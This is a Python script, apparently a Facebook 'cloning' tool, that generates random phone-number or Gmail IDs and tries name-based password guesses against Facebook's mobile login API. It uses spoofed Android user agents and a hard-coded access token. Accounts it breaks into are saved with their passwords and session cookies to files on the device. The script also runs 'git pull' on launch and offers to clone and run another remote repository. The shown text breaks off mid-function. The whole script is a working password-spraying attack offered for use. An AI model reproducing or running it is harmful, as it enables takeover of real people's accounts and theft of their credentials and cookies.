 ####@-----Import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
 pass
except:pass


import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0


####DESIGN####
def oo(t):
	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '

###USERAGENTSGEN####
'''
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

'''
ua = []

import requests
rs = requests.get
ua = []

del ua
"""
Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]
"""

ua=[]

##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed

logo= f'''
  \033[1;92m  .d8b.  db   db .88b  d88.  .d8b.  d8888b.  .d88b.
  \033[1;97m d8' `8b 88   88 88'YbdP`88 d8' `8b 88  `8D .8P  Y8.
  \033[1;92m 88ooo88 88ooo88 88  88  88 88ooo88 88   88 88    88
  \033[1;93m 88~~~88 88~~~88 88  88  88 88~~~88 88   88 88    88 
  \033[1;92m 88   88 88   88 88  88  88 88   88 88  .8D `8b  d8'    
  \033[1;97m YP   YP YP   YP YP  YP  YP YP   YP Y8888D'  `Y88P'  
  
  
\033[1;97m====================================================
\033[1;97m[+]\033[1;91m    AUTHOR   \033[1;90m: \033[1;92mAHMAD ALI
\033[1;97m[+]\033[1;91m    FACEBOOK \033[1;90m: \033[1;92mAHMADO.AFRIDI
\033[1;97m[+]\033[1;91m    GITHUB \033[1;90m: \033[1;92m  AHMADOAFRIDI
\033[1;97m====================================================
\x1b[31;1m   \x1b[47;2m[ THIS TOOL IS FREE ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ POWERED BY AHMADO AFRIDI ]\x1b[00;1m\x1b[31;1m
\033[1;97m====================================================
\033[1;97m===============================================================
\033[1;97m VERSION:\033[1;92m PRIVATE
\033[1;97m STATUS :\033[1;92m FREE TOOL
\033[1;97m NOTICE :\033[1;92m USE 10008/10009 FOR MORE OK IDS %%
\033[1;97m===============================================================
'''

####@-----Menu-----@####
def Hxw_Main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}FILE CLONING")
    print(f"{oo(2)}PAK RANDOM CLONING")
    print(f"{oo(3)}GMAIL CLONING")  

    
    print(f"{oo(0)}EXIT")
    inpp = input(f"{oo('?')}YOUR CHOICE : ")
    if inpp == "1":
        file()
    if inpp == '2':pak()
    if inpp =='3':
        gmail()
    if inpp == "4":
     print(f'{oo("+")}Loading Best File Create Command ')
     os.system('cd && ;git clone --depth=1 https://github.com/Hannan-404/FILE')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
     
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Hannan'
    else:
        file = input(f"{oo('-')}ENTER FILE: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}FILE NOT FOUND");time.sleep(1)
        Hxw_Main()
     
    method()
    exit()
    
            
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=hannan-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=hannan-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .Hannan')
        first = input(f'{oo("?")}PUT FIRST NAME: ')
        last = input(f'{oo("?")}PUT LAST NAME: ')
        domain = input(f'{oo("?")}PUT DOMAIN LIKE @gmail.com : ')
        try:
            limit = input(f'{oo("?")}PUT LIMIT: ')
        except ValueError:
            limit = 5000
        lists = ['3','4']
        for xd in range(int(limit)):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Hannan', 'r').read().splitlines()
        with tred(max_workers=30) as king___xd:
            tl = str(len(fo))
            tk = first+last
            l.append('gm')
            file()

       
        
####@-----PakNumber-----@####


def pak():
	user=[]
	code = input(f'{oo("!")}PUT CODE : ')
	try:
		limit = int(input(f'{oo("?")}PUT LIMIT :  '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	for psx in user:
		ids = code+psx
		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
	andom()



####@-----UserAgent----@####
"""
Mozilla/5.0 (Linux; Android 11; Infinix X695 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
Mozilla/5.0 (Linux; Android 13; V2169 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 11; itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
Mozilla/5.0 (Linux; Android 12; 22041219C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 12; TECNO KH6 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.2.0.20.404;]
Mozilla/5.0 (Linux; Android 11; MP02 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 12; CPH2457 Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 11; T781SPP Build/RKQ1.210614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 10; Z555 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/388.0.0.23.106;]
Mozilla/5.0 (Linux; Android 8.0.0; CUBOT_P20 Build/O00623; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]
Mozilla/5.0 (Linux; Android 10; EVE-LX9N Build/HUAWEIEVE-LX9N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/370.0.0.14.108;]
Mozilla/5.0 (Linux; Android 12; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 11; Armor 12 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 12; 22041216C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
Mozilla/5.0 (Linux; Android 10; CDY-NX9B Build/HUAWEICDY-N29B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.0.0.0.302;]
Mozilla/5.0 (Linux; Android 10; STS570 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/389.1.0.23.214;]
Mozilla/5.0 (Linux; Android 11; TECNO KG6p Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]

"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'{oo("?")}TOTAL PASSWORD ? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print('\033[1;89m='*63)
    print(f'{oo("✓")} TOTAL IDS : \033[1;92m'+str(len(accounts)))
    print(f"{oo('•')}\033[1;89m ON OFF AEROPLANE MODE AFTER EVERY 5 MINUTES :")
    print(f"{oo('•')} FILE SAVE IN /sdcard/AHMADO-OK.txt")
    print('\033[1;89m='*63)
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mAHMADO-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass: 
        
        #heads=random.choice(['first','second','third'])
                     
            AHMAD_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; CM7000plus Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230405.003.G1)","Dalvik/2.1.0 (Linux; U; Android 10; PH4003 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AI Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH2 Build/QTG3.200305.006.S36)","Dalvik/2.1.0 (Linux; U; Android 11; Hammer_Blade_5G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; 5164A Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TQ2B.230505.005.A1)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; 404KC Build/110.1.2e10)","Dalvik/2.1.0 (Linux; U; Android 9; Infinix X653C Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; SM-F936B Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-C115M Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; X526 Build/QD4A.200905.003)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A307FN Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 11; SM-G970F Build/RP1A.200720.012) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 9; STELLAR M2 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 6.0; ESP-01 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; A102SO Build/62.1.D.0.639)","Dalvik/2.1.0 (Linux; U; Android 10; SHV43-u Build/S9151)","Dalvik/2.1.0 (Linux; U; Android 6.0; I14 Pro Max Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Infinix X623B Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 13; 23049PCD8G Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 11; SM-T547U Build/RP1A.200720.012)","Dalvik/2.1.0 (Linux; U; Android 9; SM-N975F Build/PI)","Dalvik/2.1.0 (Linux; U; Android 13; M2102K1AC Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 10; A10ST Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 7.0; PSPCZ20A0 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 7.0; Hawk_from_EE Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 Build/T1RD33.116-33-3)","Dalvik/2.1.0 (Linux; U; Android 11; V2149 Build/RP1A.200720.012) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 5.1; HS-U602 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 10; MAR-LX1M Build/HUAWEIMAR-L21MEA) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; moto g(30) Build/S0RCS32.41-10-19-14) VD/235","Dalvik/2.1.0 (Linux; U; Android 9; SM-T395N Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; p231 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 11; SM-M127N Build/RP1A.200720.012)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-4-4)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; GlobmallX1 Build/MHC19J)","Dalvik/2.1.0 (Linux; U; Android 11; IRIS 4K SmartTV FF Build/RTT2.220103.001)","Dalvik/2.1.0 (Linux; U; Android 12; Q18 Build/SP1A.210812.015)","Dalvik/2.1.0 (Linux; U; Android 10; IP-70 MAX Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_x86_64 Build/SE1A.220826.006) ((2.00T_ATV::3.125.3630::emulator64_x86_64_arm64::))","Dalvik/2.1.0 (Linux; U; Android 10; TV Box Build/QTT8.201201.002) ((2.00T_ATV::3.120.3120::HY44G::))","Dalvik/2.1.0 (Linux; U; Android 10; SM-T510 Build/QP1A.190711.020) ((2.00T_AOS::0.1.770::gta3xlwifi::FTV_OTT_DT))","Dalvik/2.1.0 (Linux; U; Android 10; SM-G960F Build/QP1A.190711.020) ((2.00T_AOS::0.1.770::starlte::))","Dalvik/2.1.0 (Linux; U; Android 10; Pixel 2 Build/QP1A.191105.004) ((2.00T_AOS::0.1.731::walleye::))","Dalvik/2.1.0 (Linux; U; Android 10; OTT-G1 Build/QT) ((2.00T_G1::3.120.3164::DV6067Y::))","Dalvik/2.1.0 (Linux; U; Android 10; MagentaTV ONE Build/QTT8.201201.004) ((2.00T_G6::3.119.3071::HY44G::))","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH2 Build/QTG3.200305.006.S292) ((2.00T_ATV::3.124.3630::BRAVIA_VH2::))","Dalvik/2.1.0 (Linux; U; Android 13; RMX3612 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; AFTKA Build/PS7633.3445N) ((2.00T_AMZ::3.123.3501::kara::))","Dalvik/2.1.0 (Linux; U; Android 9; AFTGAZL Build/PS7613.3701N) ((2.00T_AMZ::3.120.local::gazelle::))","Dalvik/2.1.0 (Linux; U; Android 10; SM-G960F Build/QP1A.190711.020) ((2.00T_AOS::0.1.774::starlte::FTV_OTT_PREVIEW_DT))","Dalvik/2.1.0 (Linux; U; Android 10; sdk_google_atv_x86 Build/QTU1.200805.001) ((2.00T_ATV::3.123.3501::generic_x86::))","Dalvik/2.1.0 (Linux; U; Android 10; CLT-L29 Build/HUAWEICLT-L29) ((2.00T_AOS::0.1.659::HWCLT::))","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH2 Build/QTG3.200305.006.S252) ((2.00T_ATV::3.123.local::BRAVIA_VH2::FTV_OTT_PREVIEW_DT))","Dalvik/2.1.0 (Linux; U; Android 9; OTT-G1 Build/PI) ((2.00T_G1::3.123.3531::DV6067Y::FTV_OTT_PREVIEW_DT))","Dalvik/2.1.0 (Linux; U; Android 8.0.0; BAH2-W19 Build/HUAWEIBAH2-W19) ((2.00T_AOS::0.1.659::HWBAH2::))","Dalvik/2.1.0 (Linux; U; Android 8.0.0; Android SDK built for x86 Build/OSR1.180418.026) ((2.00T_ATV::3.124.3521::generic_x86::))","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6295) ((2.00T_AMZ::3.123.3537::mantis::))","Dalvik/2.1.0 (Linux; U; Android 13; 22101320G Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 12; Archos T101 HD WIFI Build/SQ1A.220105.002)","Dalvik/2.1.0 (Linux; U; Android 11; FP2 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G780F Build/TP1A.220624.014; BroadcastDotRadioApp )","Dalvik/1.6.0 (Linux; U; Android 4.4.2; C702 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 pro Build/S1RAS32.41-20-16-5-3-6)","Dalvik/2.1.0 (Linux; U; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; SM-A137F Build/TP1A.220624.014) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; A7000 Build/NITROGEN-OS-8.1-BY-AKS121)","Dalvik/1.6.0 (Linux; U; Android 7.0; Kids Kx Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; 5061U_TR Build/QP1A.190711.020)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; CMB405 Build/KTU84P)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; GEANT_T3 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; Moto E (4) Build/NCQS26.69-64-8)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RN4DG Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; SM-T535 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Pro Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BE52 Build/61.2.F.0.178)","Dalvik/2.1.0 (Linux; U; Android 10; V1921A Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 6.0; Pro_Max14 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 10; uie4057lgu Build/QT)","Dalvik/2.1.0 (Linux; U; Android 12; HiPad XPro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Nonchers Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 11; S22_EEA Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2219A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; KFRAPWI Build/RS8318.2031N)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A236B Build/TP1A.220624.014) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; M2006C3LVG MIUI/V12.0.16.0.QCDEUVF) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 11; M2103K19G Build/RP1A.200720.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 11; M2012K11AG Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 11; KidsPad_10 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Hisense U965 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 9; Venus V7 Build/VT1130)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one Build/QPK30.54-22)","Dalvik/2.1.0 (Linux; U; Android 11; SmartEver4KAndroidTV Build/RTM3.211215.125)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_x86_64 Build/SE1A.220826.006.A1)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; vivo Y55 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; unknown Build/RMAIN1.1142N)"])
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": AHMAD_ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mAHMADO-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m|\033[1;92m '+pword+'  ')
                open('/sdcard/AHMADO-OK.txt','a').write(f'{acc} | {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                           print(cookies)
                           open('/sdcard/AHMADO-OK.txt','a').write(f'sb={ssbb};{ckkk}\n')
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;93mAHMADO-CP\033[1;91m] \033[1;93m'+acc+' \033[1;91m|\033[1;93m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/AHMADO-CP.txt','a').write(f'{acc} | {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mAHMADO-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = "Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/311.0.0.1.378;FBBV/434770443;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": AHMAD_ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mAHMADO-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m|\033[1;92m '+pword+'  ')
                open('/sdcard/AHMADO-OK.txt','a').write(f'{acc} | {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                    try:
                           q = json.loads(response.text)
